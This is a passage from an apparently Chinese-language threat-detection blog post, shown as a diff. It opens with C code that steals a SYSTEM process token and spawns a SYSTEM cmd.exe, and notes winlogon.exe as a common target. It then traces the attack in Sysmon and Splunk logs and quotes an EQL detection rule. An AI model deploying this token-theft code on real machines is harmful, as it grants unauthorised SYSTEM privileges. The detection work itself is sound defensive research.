@@ -1,0 +1,91 @@
+        wchar_t cmdline[] = L"C:\\Windows\\System32\\cmd.exe";
+        ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
+        ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
+        startupInfo.cb = sizeof(STARTUPINFO);    
+        HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);
+        if (GetLastError() == NULL)
+            printf("[+] OpenProcess() success!\n");
+        else
+        {
+            printf("[-] OpenProcess() Return Code: %i\n", processHandle);
+            printf("[-] OpenProcess() Error: %i\n", GetLastError());
+        }
+        BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE, &tokenHandle);
+        if (GetLastError() == NULL)
+            printf("[+] OpenProcessToken() success!\n");
+        else
+        {
+            printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
+            printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
+        }
+        BOOL duplicateToken = DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);    
+        if (GetLastError() == NULL)
+            printf("[+] DuplicateTokenEx() success!\n");
+        else
+        {
+            printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
+            printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
+        }        
+        BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
+        if (GetLastError() == NULL)
+            printf("[+] Process spawned!\n");
+        else
+        {
+            printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
+            printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
+        }
+        return 0;
+    }
+这个过程建议大家有时间的话还是自己手动操作一遍，其中有很多坑需要留意，但是对于我们加深理解很有帮助
+比如我测试时发现好几次 OpenProcess() 成功了，但是 OpenProcessToken() 却报出 **[ERROR_ACCESS_DENIED
+(0x5)](https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes
+--0-499-)** 的错误
+后来才知道原来是因为我不是该进程的 **TOKEN_OWNER**
+另外，选择具备 SYSTEM 权限的目标时，要注意 **Protected Process Light** (PPL) 这个特性
+受 PPL 保护的进程需要指定 **PROCESS_QUERY_LIMITED_INFORMATION** 权限时才能执行
+OpenProcess()，不然也会报错
+针对该特点，也有非常典型的攻击手法，例如 winlogon.exe 具备 SYSTEM 权限但又不受该机制保护，所以经常被利用
+关于上述提到所需要的进程访问权限等相关信息，更多内容可以参考 [这里](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
+更多的实现原理和过程步骤，我就不再赘述了，感兴趣的可以根据这篇
+[文章](https://posts.specterops.io/understanding-and-defending-against-access-token-theft-finding-alternatives-to-winlogon-exe-80696c8a73b) 逐步复现
+接下来，我会根据复现结果的日志，借助 sysmon 和 splunk 完成 getsystem 过程中的细节分析
+首先结合前面的结论，通过对父子进程的权限继承关系进行判断，定位到相关进程主体
+拿到父进程的 Guid —— {534e2476-46b7-61dd-5508-000000000b00}，然后溯源其相关行为
+    index=windows (ParentProcessGuid="{534e2476-46b7-61dd-5508-000000000b00}" OR ProcessGuid="{534e2476-46b7-61dd-5508-000000000b00}" OR SourceProcessGUID="{534e2476-46b7-61dd-5508-000000000b00}" OR TargetProcessGuid="{534e2476-46b7-61dd-5508-000000000b00}")
+这其中，我们能发现一条很显眼的日志，由 token.exe 向 winlogon.exe 发起的进程间访问，注意它的访问权限
+_PS：sysmon 的 EID 10 中相应字段名为 ProcessGUID，而不是 ProcessGuid_
+这里对应的就是我们代码中 OpenProcess() 的过程，因为日志里 0x1400 的访问权限正是 PROCESS_QUERY_INFORMATION
+这条日志紧随其后的行为便是上述的 token.exe 进程创建了 SYSTEM 权限的 cmd.exe
+其中的 OpenProcessToken()、DuplicateTokenEx() 等行为就不是 sysmon 的能力范围了
+关于这一点，我们需要熟悉 sysmon 的日志记录原理 ——
+“为了检测 ProcessAccess 类型的日志，sysmon 采用了
+[ObRegisterCallbacks](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/fltkernel/nf-fltkernel-fltregisterfilter)
+注册线程、进程和桌面句柄操作的回调列表，以便任何进程尝试使用 [OpenProcess()](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-ntopenprocess),
+[NtOpenProcess()](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess), NtAlpcOpenSenderProcess()
+等API打开其他进程的句柄时都能够被检测到”
+写到这里了想偷个懒，针对该攻击技术，我就直接引用一段国外研究员用 EQL 写的一段检测语句吧：
+    sequence with maxspan=1m
+      [process where event.code : "10" and
+         /*
+          GrantedAccess values in scope
+          0x1000 - PROCESS_QUERY_LIMITED_INFORMATION - PPL
+          0x1400 - PROCESS_QUERY_INFORMATION
+          0x1F3FFF - PROCESS_ALL_ACCESS
+         */
+         winlog.event_data.GrantedAccess : 
+                   ("0x1000", "0x1400", "0x1F3FFF") and 
+         winlog.event_data.TargetUser : "NT AUTHORITY\\SYSTEM" and not 
+         winlog.event_data.SourceUser : "NT AUTHORITY\\*" and 
+         winlog.event_data.TargetImage : "?:\\Windows\\*.exe"] by process.entity_id
+     [process where event.code : "1" and 
+        winlog.event_data.LogonId : "0x3e7" and 
+        winlog.event_data.TerminalSessionId : "1" and 
+        not winlog.event_data.ParentUser : "NT AUTHORITY\\*"] by process.parent.entity_id
+本质上就是对前面两个检测点做关联分析，只要前面的研究功夫下到位了，这里能施展的空间才会充足
+像本文中的第一个例子，分析命名管道提权的手法时，涉及的检测点比较丰富，这时在上层做复杂规则检测就会有更多可作为的地方
+## 小结
+要做好威胁检测，对攻击和防御两方面的知识都得做到烂熟于心，真正做到知己知彼其实需要长时间的积累
+上述分析过程主要用到 sysmon 记录日志，但涉及到 Windows API 的调用，sysmon 其实是不足以胜任的
+我自己在实际分析过程中，经常遇到找不到相应日志的情况，这时如果对日志记录原理的缺乏了解，往往会无从下手
+而如果缺乏对攻击原理的熟悉，经常会忽视许多潜在的检测点，更别提去追溯相应日志了
+从原理出发或者是从特征溯源，对攻击行为自上而下的分析和自下而上的分析其实是缺一不可的，结合使用才是正确的姿势
